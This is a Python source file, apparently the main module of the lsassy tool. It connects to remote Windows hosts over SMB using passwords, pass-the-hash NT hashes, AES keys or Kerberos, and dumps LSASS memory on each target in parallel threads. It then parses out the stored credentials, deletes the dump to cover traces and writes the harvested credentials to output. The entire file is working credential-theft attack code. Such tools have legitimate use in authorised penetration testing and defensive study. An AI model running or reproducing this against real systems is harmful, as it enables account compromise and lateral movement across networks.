import logging

import threading
import ctypes
from lsassy import logger
from lsassy.utils import get_targets
from lsassy.parser import Parser
from lsassy.session import Session
from lsassy.writer import Writer
from lsassy.dumper import Dumper
from lsassy.impacketfile import ImpacketFile

lock = threading.RLock()


class Lsassy:
    def __init__(self, targets, arguments):
        self.targets = targets
        self.arguments = arguments
        self.threads = []

    def run(self):
        logger.init()

        if self.arguments.v == 1:
            logging.getLogger().setLevel(logging.INFO)
        elif self.arguments.v >= 2:
            logging.getLogger().setLevel(logging.DEBUG)
        else:
            logging.getLogger().setLevel(logging.ERROR)

        for target in get_targets(self.targets):
            thread = TLsassy(target, self.arguments)
            thread.start()
            self.threads.append(thread)

        while self.has_live_threads():
            try:
                # synchronization timeout of threads kill
                [t.join(1) for t in self.threads if t is not None and t.is_alive()]
            except KeyboardInterrupt:
                # Ctrl-C handling and send kill to threads
                logging.error("Quitting gracefully...")
                for t in self.threads:
                    t.raise_exception(KeyboardInterrupt)

    def has_live_threads(self):
        return True in [t.is_alive() for t in self.threads]


class TLsassy(threading.Thread):
    """
    Main class to extract credentials from one remote host. Can be used in different threads for parallelization
    """

    def __init__(self, target_name, arguments):
        self.target = target_name
        self.args = arguments
        super().__init__(name=target_name)

    def raise_exception(self, exception):
        t_id = 0
        if hasattr(self, '_thread_id'):
            return self._thread_id
        for id, thread in threading._active.items():
            if thread is self:
                t_id = id
        ctypes.pythonapi.PyThreadState_SetAsyncExc(ctypes.c_long(t_id), ctypes.py_object(exception))

    def run(self):
        """
        Main method to dump credentials on a remote host
        """
        session, file, dumper, method = None, None, None, None

        # Credential parsing
        username = self.args.username if self.args.username else ""
        password = self.args.password if self.args.password else ""

        lmhash, nthash = "", ""
        if not password and self.args.hashes:
            if ":" in self.args.hashes:
                lmhash, nthash = self.args.hashes.split(":")
            else:
                lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', self.args.hashes

        # Exec methods parsing
        exec_methods = self.args.exec.split(",") if self.args.exec else None

        # Dump modules options parsing
        options = {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")} if self.args.options else {}

        # Dump path checks
        dump_path = self.args.dump_path
        if dump_path:
            dump_path = dump_path.replace('/', '\\')
            if len(dump_path) > 1 and dump_path[1] == ":":
                if dump_path[0] != "C":
                    logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
                    exit(1)
                dump_path = dump_path[2:]
            if dump_path[-1] != "\\":
                dump_path += "\\"

        parse_only = self.args.parse_only

        if parse_only and (dump_path is None or self.args.dump_name is None):
            logging.error("--dump-path and --dump-name required for --parse-only option")
            exit(1)

        try:
            session = Session()
            session.get_session(
                address=self.target,
                target_ip=self.target,
                port=self.args.port,
                lmhash=lmhash,
                nthash=nthash,
                username=username,
                password=password,
                domain=self.args.domain,
                aesKey=self.args.aesKey,
                dc_ip=self.args.dc_ip,
                kerberos=self.args.kerberos,
                timeout=self.args.timeout
            )

            if session.smb_session is None:
                logging.error("Couldn't connect to remote host")
                exit(1)

            if not parse_only:
                dumper = Dumper(session, self.args.timeout).load(self.args.dump_method)
                if dumper is None:
                    logging.error("Unable to load dump module")
                    exit(1)

                file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods,
                                   dump_path=dump_path,
                                   dump_name=self.args.dump_name, timeout=self.args.timeout, **options)
                if file is None:
                    logging.error("Unable to dump lsass.")
                    exit(1)
            else:
                file = ImpacketFile(session).open(
                    share="C$",
                    path=dump_path,
                    file=self.args.dump_name,
                    timeout=self.args.timeout
                )
                if file is None:
                    logging.error("Unable to open lsass dump.")
                    exit(1)

            credentials = Parser(file).parse(parse_only=parse_only)
            file.close()

            if not parse_only:
                ImpacketFile.delete(session, file.get_file_path(), timeout=self.args.timeout)
                logging.success("Lsass dump successfully deleted")
            else:
                logging.debug("Not deleting lsass dump as --parse-only was provided")

            if credentials is None:
                logging.error("Unable to extract credentials from lsass. Cleaning.")
                exit(1)

            with lock:
                Writer(credentials).write(
                    self.args.format,
                    output_file=self.args.outfile,
                    quiet=self.args.quiet,
                    users_only=self.args.users
                )

        except KeyboardInterrupt:
            pass
        except Exception as e:
            logging.error("An unknown error has occurred.", exc_info=True)
        finally:
            logging.debug("Cleaning...")
            logging.debug("dumper: {}".format(dumper))
            logging.debug("file: {}".format(file))
            logging.debug("session: {}".format(session))
            try:
                dumper.clean()
                logging.debug("Dumper cleaned")
            except Exception as e:
                logging.debug("Potential issue while cleaning dumper: {}".format(str(e)))

            try:
                file.close()
                logging.debug("File closed")
            except Exception as e:
                logging.debug("Potential issue while closing file: {}".format(str(e)))

            if not parse_only:
                try:
                    if ImpacketFile.delete(session, file_path=file.get_file_path(), timeout=self.args.timeout):
                        logging.success("Lsass dump successfully deleted")
                except Exception as e:
                    logging.debug("Potential issue while deleting lsass dump: {}".format(str(e)))

            try:
                session.smb_session.close()
                logging.debug("SMB session closed")
            except Exception as e:
                logging.debug("Potential issue while closing SMB session: {}".format(str(e)))